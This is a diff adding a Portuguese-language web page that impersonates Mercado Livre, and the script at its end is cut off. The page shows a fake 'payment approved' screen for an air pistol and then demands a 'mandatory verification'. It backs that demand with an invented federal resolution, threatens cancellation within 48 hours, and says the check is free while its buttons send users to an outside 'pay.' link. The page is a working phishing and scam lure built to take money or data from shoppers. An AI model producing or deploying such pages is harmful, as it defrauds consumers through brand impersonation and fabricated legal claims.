@@ -1,0 +1,1314 @@
+<!DOCTYPE html><html lang="pt-BR"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pagamento Aprovado - Verificação Obrigatória</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
+            color: #333;
+            background-color: #ebebeb;
+        }
+
+        /* Tela de sucesso inicial */
+        .success-screen {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(135deg, #00a650, #00d863);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            opacity: 1;
+            transition: opacity 0.8s ease-out;
+        }
+
+        .success-screen.fade-out {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .success-icon {
+            width: 120px;
+            height: 120px;
+            background: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 32px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15);
+            animation: successPulse 2s infinite;
+        }
+
+        @keyframes successPulse {
+            0% { transform: scale(1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15); }
+            50% { transform: scale(1.05); box-shadow: 0 12px 40px rgba(0, 0, 0, 0.25); }
+            100% { transform: scale(1); box-shadow: 0 8px 32px rgba(0, 0, 0, 0.15); }
+        }
+
+        .success-icon svg {
+            width: 70px;
+            height: 70px;
+            stroke: #00a650;
+            stroke-width: 3;
+        }
+
+        .success-text {
+            color: white;
+            font-size: 32px;
+            font-weight: 700;
+            text-align: center;
+            max-width: 500px;
+            padding: 0 20px;
+            text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+            animation: textGlow 2s infinite alternate;
+        }
+
+        @keyframes textGlow {
+            0% { text-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+            100% { text-shadow: 0 4px 8px rgba(0, 0, 0, 0.2), 0 0 20px rgba(255, 255, 255, 0.3); }
+        }
+
+        /* Header */
+        .header {
+            background: white;
+            box-shadow: 0 2px 8px rgba(0, 0, 0, 0.1);
+            padding: 16px 0;
+            margin-bottom: 24px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .header-content {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .logo-icon {
+            width: 40px;
+            height: 40px;
+            background: linear-gradient(135deg, #3483fa, #2968c8);
+            border-radius: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            animation: logoFloat 3s ease-in-out infinite;
+        }
+
+        @keyframes logoFloat {
+            0%, 100% { transform: translateY(0px); }
+            50% { transform: translateY(-3px); }
+        }
+
+        .logo-icon svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+
+        .logo-text {
+            font-size: 24px;
+            font-weight: bold;
+            color: #3483fa;
+        }
+
+        /* Container principal */
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 0 20px;
+        }
+
+        /* Cards */
+        .card {
+            background: white;
+            border-radius: 12px;
+            box-shadow: 0 2px 12px rgba(0, 0, 0, 0.08);
+            margin-bottom: 24px;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            opacity: 0;
+            transform: translateY(20px);
+            animation: cardSlideIn 0.6s ease forwards;
+        }
+
+        @keyframes cardSlideIn {
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .card:hover {
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.12);
+            transform: translateY(-2px);
+        }
+
+        .card-header {
+            padding: 24px 24px 0 24px;
+        }
+
+        .card-content {
+            padding: 24px;
+        }
+
+        .card-title {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 16px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .card-title svg {
+            width: 24px;
+            height: 24px;
+            stroke: #3483fa;
+            stroke-width: 2;
+        }
+
+        /* Status de pagamento */
+        .payment-status {
+            background: linear-gradient(135deg, #00a650, #00d863);
+            color: white;
+            text-align: center;
+            padding: 40px 24px;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .payment-status::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: radial-gradient(circle, rgba(255, 255, 255, 0.1) 0%, transparent 70%);
+            animation: shimmer 3s linear infinite;
+        }
+
+        @keyframes shimmer {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .payment-status h1 {
+            font-size: 36px;
+            font-weight: 700;
+            margin-bottom: 12px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .payment-status p {
+            font-size: 18px;
+            opacity: 0.95;
+            position: relative;
+            z-index: 1;
+        }
+
+        /* Número do pedido */
+        .order-info {
+            text-align: center;
+            padding: 20px 24px;
+            background: #f8f9fa;
+            border-radius: 8px;
+            margin-bottom: 24px;
+        }
+
+        .order-number {
+            font-size: 16px;
+            color: #666;
+            font-weight: 500;
+        }
+
+        /* Produto */
+        .product-section {
+            display: grid;
+            grid-template-columns: 250px 1fr;
+            gap: 32px;
+            align-items: start;
+        }
+
+        .product-image {
+            width: 100%;
+            height: 250px;
+            -o-object-fit: cover;
+               object-fit: cover;
+            border-radius: 12px;
+            border: 2px solid #e6e6e6;
+            transition: all 0.3s ease;
+            animation: productGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes productGlow {
+            0%, 100% { box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1); }
+            50% { box-shadow: 0 8px 24px rgba(52, 131, 250, 0.2); }
+        }
+
+        .product-details h3 {
+            font-size: 20px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 16px;
+        }
+
+        .product-details p {
+            color: #666;
+            margin-bottom: 12px;
+            font-size: 15px;
+        }
+
+        /* Aviso de verificação */
+        .verification-notice {
+            background: linear-gradient(135deg, #fff8e1, #ffecb3);
+            border-left: 6px solid #3483fa;
+            padding: 32px;
+            margin: 24px 0;
+            border-radius: 0 12px 12px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .verification-notice::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, #3483fa, #2968c8, #3483fa);
+            animation: warningPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes warningPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .verification-notice h3 {
+            color: #2968c8;
+            font-size: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+        }
+
+        .verification-notice svg {
+            width: 28px;
+            height: 28px;
+            stroke: #2968c8;
+            stroke-width: 2;
+            animation: warningShake 3s ease-in-out infinite;
+        }
+
+        @keyframes warningShake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-2deg); }
+            75% { transform: rotate(2deg); }
+        }
+
+        .verification-notice p {
+            color: #1565c0;
+            margin-bottom: 16px;
+            line-height: 1.7;
+            font-size: 15px;
+        }
+
+        .regulation {
+            font-size: 13px;
+            color: #1976d2;
+            font-style: italic;
+            background: rgba(255, 255, 255, 0.7);
+            padding: 16px;
+            border-radius: 8px;
+            margin-top: 20px;
+            border: 1px solid #bbdefb;
+        }
+
+        /* Botão de verificação */
+        .verification-button-section {
+            text-align: center;
+            padding: 40px 24px;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+        }
+
+        .verification-button {
+            display: inline-block;
+            padding: 20px 50px;
+            background: linear-gradient(135deg, #3483fa, #2968c8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 18px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(52, 131, 250, 0.4);
+            position: relative;
+            overflow: hidden;
+            animation: buttonPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes buttonPulse {
+            0%, 100% { 
+                transform: scale(1);
+                box-shadow: 0 6px 20px rgba(52, 131, 250, 0.4);
+            }
+            50% { 
+                transform: scale(1.02);
+                box-shadow: 0 8px 30px rgba(52, 131, 250, 0.6);
+            }
+        }
+
+        .verification-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .verification-button:hover::before {
+            left: 100%;
+        }
+
+        .verification-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 10px 35px rgba(52, 131, 250, 0.6);
+        }
+
+        .verification-button svg {
+            width: 20px;
+            height: 20px;
+            margin-right: 8px;
+            vertical-align: middle;
+        }
+
+        /* Linha de progresso */
+        .progress-section {
+            padding: 40px 24px;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+        }
+
+        .progress-title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #333;
+            margin-bottom: 40px;
+            text-align: center;
+        }
+
+        .progress-container {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            position: relative;
+            max-width: 700px;
+            margin: 0 auto;
+        }
+
+        .progress-line {
+            position: absolute;
+            top: 25px;
+            left: 8%;
+            right: 8%;
+            height: 4px;
+            background: #e6e6e6;
+            z-index: 1;
+            border-radius: 2px;
+        }
+
+        .progress-line::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 50%;
+            height: 100%;
+            background: linear-gradient(90deg, #00a650, #00d863);
+            transition: width 0.8s ease;
+            border-radius: 2px;
+            animation: progressGlow 2s ease-in-out infinite;
+        }
+
+        @keyframes progressGlow {
+            0%, 100% { box-shadow: 0 0 5px rgba(0, 166, 80, 0.5); }
+            50% { box-shadow: 0 0 15px rgba(0, 166, 80, 0.8); }
+        }
+
+        .progress-step {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            z-index: 2;
+            position: relative;
+            flex: 1;
+        }
+
+        .progress-step-circle {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+            font-size: 16px;
+            font-weight: bold;
+            color: white;
+            border: 4px solid white;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+            transition: all 0.3s ease;
+        }
+
+        .progress-step.completed .progress-step-circle {
+            background: linear-gradient(135deg, #00a650, #00d863);
+            animation: completedBounce 2s ease-in-out infinite;
+        }
+
+        @keyframes completedBounce {
+            0%, 100% { transform: scale(1); }
+            50% { transform: scale(1.05); }
+        }
+
+        .progress-step.current .progress-step-circle {
+            background: linear-gradient(135deg, #3483fa, #2968c8);
+            animation: currentPulse 1.5s ease-in-out infinite;
+        }
+
+        @keyframes currentPulse {
+            0% { 
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 0 rgba(52, 131, 250, 0.7); 
+                transform: scale(1);
+            }
+            70% { 
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 15px rgba(52, 131, 250, 0); 
+                transform: scale(1.05);
+            }
+            100% { 
+                box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15), 0 0 0 0 rgba(52, 131, 250, 0); 
+                transform: scale(1);
+            }
+        }
+
+        .progress-step.pending .progress-step-circle {
+            background: #e6e6e6;
+            color: #999;
+        }
+
+        .progress-step-label {
+            font-size: 14px;
+            text-align: center;
+            max-width: 140px;
+            line-height: 1.4;
+            font-weight: 500;
+        }
+
+        .progress-step.completed .progress-step-label {
+            color: #00a650;
+            font-weight: 600;
+        }
+
+        .progress-step.current .progress-step-label {
+            color: #3483fa;
+            font-weight: 700;
+            animation: labelPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes labelPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.7; }
+        }
+
+        .progress-step.pending .progress-step-label {
+            color: #999;
+        }
+
+        /* Card de consequências */
+        .consequences-card {
+            background: linear-gradient(135deg, #e3f2fd, #bbdefb);
+            border: 2px solid #2196f3;
+            border-radius: 12px;
+            padding: 32px;
+            margin: 24px 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .consequences-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, #2196f3, #1976d2, #2196f3);
+            animation: dangerPulse 2s ease-in-out infinite;
+        }
+
+        @keyframes dangerPulse {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.6; }
+        }
+
+        .consequences-card h3 {
+            color: #1976d2;
+            font-size: 20px;
+            margin-bottom: 20px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-weight: 600;
+        }
+
+        .consequences-card svg {
+            width: 28px;
+            height: 28px;
+            stroke: #1976d2;
+            stroke-width: 2;
+            animation: dangerShake 3s ease-in-out infinite;
+        }
+
+        @keyframes dangerShake {
+            0%, 100% { transform: rotate(0deg); }
+            25% { transform: rotate(-3deg); }
+            75% { transform: rotate(3deg); }
+        }
+
+        .consequences-list {
+            list-style: none;
+            padding: 0;
+        }
+
+        .consequences-list li {
+            color: #1565c0;
+            margin-bottom: 16px;
+            padding-left: 32px;
+            position: relative;
+            font-size: 15px;
+            line-height: 1.6;
+        }
+
+        .consequences-list li::before {
+            content: '';
+            position: absolute;
+            left: 0;
+            top: 6px;
+            width: 20px;
+            height: 20px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='%231976d2' stroke-width='2'%3E%3Cpath d='m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z'/%3E%3Cpath d='M12 9v4'/%3E%3Cpath d='m12 17 .01 0'/%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+            animation: warningBlink 2s ease-in-out infinite;
+        }
+
+        @keyframes warningBlink {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.5; }
+        }
+
+        /* FAQ */
+        .faq-item {
+            border-bottom: 1px solid #e6e6e6;
+            padding: 24px 0;
+            transition: all 0.3s ease;
+        }
+
+        .faq-item:last-child {
+            border-bottom: none;
+        }
+
+        .faq-item:hover {
+            background: rgba(52, 131, 250, 0.02);
+            margin: 0 -24px;
+            padding: 24px;
+            border-radius: 8px;
+        }
+
+        .faq-question {
+            font-weight: 600;
+            color: #333;
+            cursor: pointer;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 0;
+            font-size: 16px;
+            transition: color 0.3s ease;
+        }
+
+        .faq-question:hover {
+            color: #3483fa;
+        }
+
+        .faq-answer {
+            color: #666;
+            margin-top: 16px;
+            line-height: 1.7;
+            display: none;
+            font-size: 15px;
+            padding-left: 16px;
+            border-left: 3px solid #e9ecef;
+        }
+
+        .faq-answer.active {
+            display: block;
+            animation: fadeInDown 0.3s ease;
+        }
+
+        @keyframes fadeInDown {
+            from {
+                opacity: 0;
+                transform: translateY(-10px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .faq-icon {
+            width: 20px;
+            height: 20px;
+            stroke: currentColor;
+            stroke-width: 2;
+            transition: transform 0.3s ease;
+        }
+
+        .faq-question.active .faq-icon {
+            transform: rotate(180deg);
+        }
+
+        /* Botão principal */
+        .cta-section {
+            text-align: center;
+            padding: 60px 24px;
+            background: linear-gradient(135deg, #f8f9fa, #e9ecef);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .cta-section::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: radial-gradient(circle at 50% 50%, rgba(52, 131, 250, 0.05) 0%, transparent 70%);
+            animation: ctaGlow 4s ease-in-out infinite;
+        }
+
+        @keyframes ctaGlow {
+            0%, 100% { opacity: 0.5; }
+            50% { opacity: 1; }
+        }
+
+        .cta-title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #333;
+            margin-bottom: 20px;
+            position: relative;
+            z-index: 1;
+        }
+
+        .cta-subtitle {
+            font-size: 18px;
+            color: #666;
+            margin-bottom: 40px;
+            max-width: 600px;
+            margin-left: auto;
+            margin-right: auto;
+            line-height: 1.6;
+            position: relative;
+            z-index: 1;
+        }
+
+        .cta-button {
+            display: inline-block;
+            padding: 24px 60px;
+            background: linear-gradient(135deg, #3483fa, #2968c8);
+            color: white;
+            border: none;
+            border-radius: 12px;
+            font-size: 20px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(52, 131, 250, 0.4);
+            position: relative;
+            overflow: hidden;
+            z-index: 1;
+            animation: ctaButtonPulse 3s ease-in-out infinite;
+        }
+
+        @keyframes ctaButtonPulse {
+            0%, 100% { 
+                transform: scale(1);
+                box-shadow: 0 6px 20px rgba(52, 131, 250, 0.4);
+            }
+            50% { 
+                transform: scale(1.02);
+                box-shadow: 0 8px 30px rgba(52, 131, 250, 0.6);
+            }
+        }
+
+        .cta-button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.3), transparent);
+            transition: left 0.6s ease;
+        }
+
+        .cta-button:hover::before {
+            left: 100%;
+        }
+
+        .cta-button:hover {
+            transform: translateY(-3px) scale(1.02);
+            box-shadow: 0 10px 35px rgba(52, 131, 250, 0.6);
+        }
+
+        .cta-button:active {
+            transform: translateY(-1px) scale(1.01);
+        }
+
+        .cta-button svg {
+            width: 24px;
+            height: 24px;
+            margin-right: 12px;
+            vertical-align: middle;
+        }
+
+        /* Footer */
+        .footer {
+            background: #333;
+            color: white;
+            text-align: center;
+            padding: 40px 20px;
+            margin-top: 48px;
+        }
+
+        .footer p {
+            margin-bottom: 12px;
+        }
+
+        .footer-links {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-top: 20px;
+        }
+
+        .footer-links a {
+            color: #ccc;
+            text-decoration: none;
+            font-size: 14px;
+            transition: color 0.3s ease;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        /* Responsividade */
+        @media (max-width: 768px) {
+            .container {
+                padding: 0 16px;
+            }
+
+            .header-content {
+                padding: 0 16px;
+            }
+
+            .card-content {
+                padding: 20px;
+            }
+
+            .product-section {
+                grid-template-columns: 1fr;
+                gap: 20px;
+                text-align: center;
+            }
+
+            .product-image {
+                max-width: 250px;
+                margin: 0 auto;
+            }
+
+            .progress-container {
+                flex-direction: column;
+                gap: 32px;
+            }
+
+            .progress-line {
+                display: none;
+            }
+
+            .progress-step {
+                flex-direction: row;
+                text-align: left;
+                width: 100%;
+            }
+
+            .progress-step-circle {
+                margin-right: 20px;
+                margin-bottom: 0;
+            }
+
+            .success-text {
+                font-size: 24px;
+            }
+
+            .payment-status h1 {
+                font-size: 28px;
+            }
+
+            .cta-title {
+                font-size: 24px;
+            }
+
+            .cta-button {
+                width: 100%;
+                max-width: 350px;
+                padding: 20px 40px;
+            }
+
+            .verification-button {
+                width: 100%;
+                max-width: 350px;
+                padding: 18px 40px;
+            }
+
+            .footer-links {
+                flex-direction: column;
+                gap: 16px;
+            }
+        }
+
+        @media (max-width: 480px) {
+            .card-content {
+                padding: 16px;
+            }
+
+            .cta-section {
+                padding: 40px 16px;
+            }
+
+            .verification-button-section {
+                padding: 30px 16px;
+            }
+
+            .logo-text {
+                font-size: 20px;
+            }
+        }
+
+        /* Animações de entrada escalonadas */
+        .card:nth-child(1) { animation-delay: 0.1s; }
+        .card:nth-child(2) { animation-delay: 0.2s; }
+        .card:nth-child(3) { animation-delay: 0.3s; }
+        .card:nth-child(4) { animation-delay: 0.4s; }
+        .card:nth-child(5) { animation-delay: 0.5s; }
+        .card:nth-child(6) { animation-delay: 0.6s; }
+        .card:nth-child(7) { animation-delay: 0.7s; }
+    </style>
+</head>
+<body>
+    <!-- Tela de sucesso inicial -->
+    <div class="success-screen" id="successScreen">
+        <div class="success-icon">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                <polyline points="20,6 9,17 4,12"></polyline>
+            </svg>
+        </div>
+        <div class="success-text">Pagamento aprovado com sucesso!</div>
+    </div>
+
+<!-- Header -->
+<div class="header">
+    <div class="header-content">
+        <div class="logo">
+            <img src="images/mercado-livre-logo-8.png" alt="Mercado Livre Logo" style="height: 40px;">
+        </div>
+    </div>
+</div>
+
+
+    <!-- Conteúdo principal -->
+    <div class="container">
+        <!-- Status do pagamento -->
+        <div class="card">
+            <div class="payment-status">
+                <h1>Pagamento Confirmado</h1>
+                <p>Seu pedido foi processado com sucesso e está aguardando verificação</p>
+            </div>
+        </div>
+
+        <!-- Número do pedido -->
+        <div class="order-info">
+            <div class="order-number">Pedido #ML-2024-00789456</div>
+        </div>
+
+        <!-- Produto -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <rect x="3" y="3" width="18" height="18" rx="2" ry="2"></rect>
+                        <circle cx="9" cy="9" r="2"></circle>
+                        <path d="m21 15-3.086-3.086a2 2 0 0 0-2.828 0L6 21"></path>
+                    </svg>
+                    Produto Adquirido
+                </div>
+            </div>
+            <div class="card-content">
+                <div class="product-section">
+                    <img src="images/1.png" alt="Produto adquirido" class="product-image">
+                    <div class="product-details">
+                        <h3>Pistola de Pressão</h3>
+                        <p><strong>Código:</strong> PSP-2024-VER</p>
+                        <p><strong>Categoria:</strong> Produtos Sensíveis</p>
+                        <p><strong>Status:</strong> Aguardando Verificação Obrigatória</p>
+                        <p><strong>Vendedor:</strong> Loja Oficial Certificada</p>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Aviso de verificação -->
+        <div class="card">
+            <div class="card-content">
+                <div class="verification-notice">
+                    <h3>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <path d="m21.73 18-8-14a2 2 0 0 0-3.48 0l-8 14A2 2 0 0 0 4 21h16a2 2 0 0 0 1.73-3Z"></path>
+                            <path d="M12 9v4"></path>
+                            <path d="m12 17 .01 0"></path>
+                        </svg>
+                        Verificação Obrigatória Requerida
+                    </h3>
+                    <p>
+                        Devido à natureza específica do produto adquirido, que pode conter componentes de aparência potencialmente ofensiva ou simulação de equipamentos de pressão, é necessária uma verificação adicional antes da liberação da entrega.
+                    </p>
+                    <p>
+                        Este procedimento de análise obrigatória segue as diretrizes estabelecidas pela <strong>Resolução Federal nº 12.947/2024</strong>, que regulamenta o transporte e entrega de produtos que possam requerer validação adicional de segurança.
+                    </p>
+                    <p>
+                        A verificação é um processo rápido e seguro, realizado através de nossos parceiros certificados, garantindo que todos os produtos sejam entregues em conformidade com as normas vigentes.
+                    </p>
+                    <div class="regulation">
+                        <strong>Base Legal:</strong> A verificação será realizada em conformidade com as normas de segurança e transporte vigentes no território nacional, conforme Art. 15 da Resolução Federal nº 12.947/2024 do Ministério da Segurança Pública.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Botão de verificação -->
+        <div class="card">
+            <div class="verification-button-section">
+                <a href="https://pay.comprasegura.fun/N1nVZpY0yDMGlM6" class="verification-button">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <rect x="3" y="11" width="18" height="11" rx="2" ry="2"></rect>
+                        <circle cx="12" cy="16" r="1"></circle>
+                        <path d="m7 11V7a5 5 0 0 1 10 0v4"></path>
+                    </svg>
+                    Iniciar Verificação Obrigatória
+                </a>
+            </div>
+        </div>
+
+        <!-- Progresso do pedido -->
+        <div class="card">
+            <div class="progress-section">
+                <div class="progress-title">Acompanhe o Status do seu Pedido</div>
+                <div class="progress-container">
+                    <div class="progress-line"></div>
+                    <div class="progress-step completed">
+                        <div class="progress-step-circle">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" style="width: 20px; height: 20px;">
+                                <polyline points="20,6 9,17 4,12"></polyline>
+                            </svg>
+                        </div>
+                        <div class="progress-step-label">Pedido Aprovado</div>
+                    </div>
+                    <div class="progress-step current">
+                        <div class="progress-step-circle">2</div>
+                        <div class="progress-step-label">Verificação Obrigatória</div>
+                    </div>
+                    <div class="progress-step pending">
+                        <div class="progress-step-circle">3</div>
+                        <div class="progress-step-label">Liberação Final</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Consequências -->
+        <div class="card">
+            <div class="card-content">
+                <div class="consequences-card">
+                    <h3>
+                        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <circle cx="12" cy="12" r="10"></circle>
+                            <path d="M12 8v4"></path>
+                            <path d="m12 16 .01 0"></path>
+                        </svg>
+                        Importante: Consequências da Não Verificação
+                    </h3>
+                    <ul class="consequences-list">
+                        <li>Cancelamento automático do pedido após 48 horas</li>
+                        <li>Retenção temporária do produto nos Correios</li>
+                        <li>Necessidade de reprocessamento do pedido</li>
+                        <li>Possível bloqueio temporário para produtos similares</li>
+                        <li>Atraso na entrega por questões regulamentares</li>
+                        <li>Perda da garantia de entrega expressa</li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <!-- FAQ -->
+        <div class="card">
+            <div class="card-header">
+                <div class="card-title">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                        <circle cx="12" cy="12" r="10"></circle>
+                        <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path>
+                        <path d="m12 17 .01 0"></path>
+                    </svg>
+                    Perguntas Frequentes
+                </div>
+            </div>
+            <div class="card-content">
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        Por que meu produto precisa de verificação?
+                        <svg class="faq-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <polyline points="6,9 12,15 18,9"></polyline>
+                        </svg>
+                    </div>
+                    <div class="faq-answer">
+                        Produtos com aparência que pode ser considerada ofensiva ou que simulam equipamentos de pressão requerem verificação adicional conforme a Resolução Federal nº 12.947/2024. Isso garante conformidade com as normas de transporte e segurança, protegendo tanto o consumidor quanto os operadores logísticos.
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        Quanto tempo demora a verificação?
+                        <svg class="faq-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <polyline points="6,9 12,15 18,9"></polyline>
+                        </svg>
+                    </div>
+                    <div class="faq-answer">
+                        O processo de verificação é realizado em até 24 horas úteis após o início. Uma vez aprovado, seu produto será liberado imediatamente para envio. O processo é automatizado e muito eficiente.
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        O que acontece se eu não fizer a verificação?
+                        <svg class="faq-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <polyline points="6,9 12,15 18,9"></polyline>
+                        </svg>
+                    </div>
+                    <div class="faq-answer">
+                        Sem a verificação, o produto ficará retido e o pedido será cancelado automaticamente após 48 horas. O reembolso será processado, mas pode haver atrasos devido às questões regulamentares. Recomendamos completar a verificação para evitar inconvenientes.
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        A verificação é segura?
+                        <svg class="faq-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <polyline points="6,9 12,15 18,9"></polyline>
+                        </svg>
+                    </div>
+                    <div class="faq-answer">
+                        Sim, o processo é totalmente seguro e realizado através de nossos parceiros certificados. Todas as informações são protegidas por criptografia de ponta e seguem os mais altos padrões de segurança. Utilizamos a mesma tecnologia dos grandes bancos.
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        Posso cancelar o pedido ao invés de fazer a verificação?
+                        <svg class="faq-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <polyline points="6,9 12,15 18,9"></polyline>
+                        </svg>
+                    </div>
+                    <div class="faq-answer">
+                        Sim, você pode cancelar o pedido a qualquer momento. O reembolso será processado em até 5 dias úteis. Porém, recomendamos completar a verificação para receber seu produto normalmente, já que o processo é rápido e simples.
+                    </div>
+                </div>
+
+                <div class="faq-item">
+                    <div class="faq-question" onclick="toggleFaq(this)">
+                        Há algum custo adicional para a verificação?
+                        <svg class="faq-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor">
+                            <polyline points="6,9 12,15 18,9"></polyline>
+                        </svg>
+                    </div>
+                    <div class="faq-answer">
+                        Não, a verificação é um processo gratuito e obrigatório conforme a legislação vigente. Não há custos adicionais para o cliente. É parte do nosso compromisso com a segurança e conformidade legal.
+                    </div>
+                </div>
+            </div>
+        </div>
+
+
+    <!-- Footer -->
+    <div class="footer">
+        <p>2024 Mercado Livre - Todos os direitos reservados</p>
+        <p>Plataforma segura e confiável para suas compras online</p>
+        <div class="footer-links">
+            <a href="#">Política de Privacidade</a>
+            <a href="#">Termos de Uso</a>
+            <a href="#">Central de Ajuda</a>
+            <a href="#">Contato</a>
+            <a href="#">Segurança</a>
+        </div>
+    </div>
+
+    <script>
+        // Gerenciar fade-out da tela de sucesso
+        window.addEventListener('DOMContentLoaded', function() {
+            const successScreen = document.getElementById('successScreen');
+            
+            setTimeout(function() {
+                successScreen.classList.add('fade-out');
+                
+                setTimeout(function() {
